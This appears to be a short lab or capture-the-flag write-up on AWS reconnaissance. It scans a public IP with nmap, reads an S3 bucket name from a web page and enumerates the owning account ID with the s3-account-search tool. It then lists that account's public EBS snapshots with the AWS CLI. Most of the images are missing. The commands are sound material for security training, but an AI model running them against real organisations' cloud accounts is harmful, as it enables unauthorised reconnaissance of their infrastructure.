
first step is port scanning of the public IP 
```
nmap -Pn 54.204.171.32
```

Quick inspect of the web page reveals that is a static website and it's image are stored in a S3 bucket
![[Pasted image 20240523192343.png]]
so... voila! the bucket name where images are stored is **mega-big-tech**

We will be using our AWS account that have following role permissions:
![[Pasted image 20240523192542.png]]

Log in our AWS account using CLI:

![[Pasted image 20240523195044.png]]

We will use an open source tool called s3-search-account (python script that is searching account ids based on wildcards): we need to provide the Amazon Resource Name (ARN) of the role under our control (i.e. in our own AWS account), as well as a target S3 bucket in the AWS account whose ID we want to enumerate.
![[Pasted image 20240523194443.png]]
![[Pasted image 20240523194629.png]]
```
s3-account-search arn:aws:iam::427648302155:role/LeakyBucket mega-big-tech
```
  
To find the S3 bucket region we will use cURL.

```
curl -I https://mega-big-tech.s3.amazonaws.com
```

```
aws ec2 describe-snapshots \
    --owner-ids 107513503799 \
    --query "Snapshots[*].{ID:SnapshotId,Time:StartTime}"
```
 
![[Pasted image 20240523194057.png]]
